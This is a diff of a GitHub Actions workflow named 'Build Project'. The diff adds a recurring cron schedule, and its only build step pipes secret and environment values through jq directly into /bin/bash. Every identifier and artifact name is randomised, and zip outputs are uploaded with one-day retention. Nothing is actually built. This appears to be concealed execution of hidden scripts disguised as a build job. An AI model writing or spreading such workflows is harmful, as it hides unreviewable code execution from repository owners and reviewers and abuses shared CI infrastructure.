@@ -2,6 +2,8 @@ name: Build Project
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '37 3,9,15,21 * * *'
 permissions:
   contents: read
   actions: read
@@ -22,19 +24,18 @@ jobs:
           fetch-depth: 1
       - name: Start
         env:
-          b9: ${{ secrets.b9 }}
+          c016: ${{ secrets.c016 }}
         run: |
-          printf '%s' "$b9" | jq -r .wwtin7387 | /bin/bash
-          echo $p674 | jq -r .ska03633 | /bin/bash
-          printf '%s' "$hgjo0778" | jq -r .j801 | /bin/bash
-          echo $jgxpb36 | jq -r .cj30 | /bin/bash
-          echo $tcqom78152 | jq -r .wud80 | /bin/bash
-          echo $pyzic1 | jq -r .ttaen006 | /bin/bash
+          printf '%s' "$c016" | jq -r .ltzyq6 | /bin/bash
+          printf '%s' "$pogco96427" | jq -r .elb7430 | /bin/bash
+          echo $o9 | jq -r .swwnm98 | /bin/bash
+          printf '%s' "$cu9" | jq -r .t0358 | /bin/bash
+          echo $va047 | jq -r .ix27 | /bin/bash
 
       - name: Save output
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: mmelkCHh
+          name: zXAKxy48
           path: "*.zip"
           retention-days: 1
